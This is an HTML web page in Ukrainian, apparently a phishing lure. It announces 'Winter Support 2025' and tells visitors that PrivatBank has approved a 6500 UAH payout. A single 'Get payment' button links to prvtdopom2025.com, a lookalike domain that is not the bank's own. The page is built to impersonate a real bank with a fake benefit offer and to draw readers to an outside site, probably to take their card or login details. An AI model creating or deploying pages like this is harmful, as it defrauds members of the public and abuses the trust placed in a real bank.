<!DOCTYPE html>
<html lang="uk">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Зимова Підтримка</title>

<link rel="icon" type="image/x-icon" href="favicon.ico" />

<style>
  :root{
    --bg:#efedea;
    --card:#ffffff;
    --text:#202124;
    --muted:#6b7280;
    --accent:#2EA44F;
    --accent-hover:#278b43;
    --brand:#e8f4ea;
    --radius:22px;
    --shadow:0 18px 50px rgba(0,0,0,.08),0 2px 8px rgba(0,0,0,.06);
  }

  *{box-sizing:border-box}
  html,body{height:100%}
  body{
    margin:0;
    font-family:system-ui,Segoe UI,Roboto,Arial;
    background:var(--bg);
    display:flex;
    align-items:center;
    justify-content:center;
    padding:24px;
  }

  .card{
    width:min(720px,100%);
    background:var(--card);
    border-radius:var(--radius);
    box-shadow:var(--shadow);
    padding:28px 26px 32px;
    text-align:center;
  }

  .logo{
    width:60px;
    height:60px;
    border-radius:15px;
    background:var(--brand);
    margin:auto;
    overflow:hidden;
    display:flex;
    align-items:center;
    justify-content:center;
  }
  .logo img{
    width:100%;
    height:100%;
    object-fit:cover;
    display:block;
  }

  h1{
    margin:16px 0 10px;
    font-size:24px;
    font-weight:700;
    color:var(--text);
  }

  p{
    margin:8px 0 26px;
    font-size:19px;
    color:var(--text);
    line-height:1.35;
  }

  .btn{
    display:inline-block;
    background:var(--accent);
    color:#fff;
    padding:16px 28px;
    border-radius:12px;
    font-size:18px;
    text-decoration:none;
    font-weight:600;
    transition:.15s;
  }
  .btn:hover{background:var(--accent-hover)}
  .btn:active{transform:translateY(1px)}

  @media(max-width:420px){
    .card{padding:22px 18px 26px}
    h1{font-size:20px}
    p{font-size:17px}
    .btn{width:100%;font-size:17px;padding:14px}
  }
</style>
</head>
<body>

<div class="card">
  <div class="logo">

    <img src="logo.jpeg" alt="Логотип" />
  </div>

  <h1>Зимова Підтримка 2025</h1>
  <p>Вам узгоджено <b>6500 грн</b> від ПриватБанку</p>


  <a class="btn" href="https://prvtdopom2025.com/gety/588694" target="_blank">Отримати виплату</a>
</div>

</body>
</html>
